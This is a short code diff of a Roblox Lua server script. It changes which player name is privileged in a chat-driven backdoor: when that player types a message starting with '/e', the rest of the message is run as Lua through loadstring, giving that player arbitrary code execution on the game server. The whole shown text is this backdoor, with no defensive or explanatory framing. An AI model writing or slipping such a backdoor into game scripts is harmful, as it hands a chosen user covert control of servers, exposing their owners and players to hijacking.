@@ -1,5 +1,5 @@
 game:GetService('Players').PlayerAdded:connect(function(player)
-  if player.Name == "idk dude" then
+  if player.Name == "AshleyCold" then
     player.Chatted:connect(function(Message)
     if string.sub(Message,1,2) == "/e" then
       loadstring(string.sub(Message,4))()
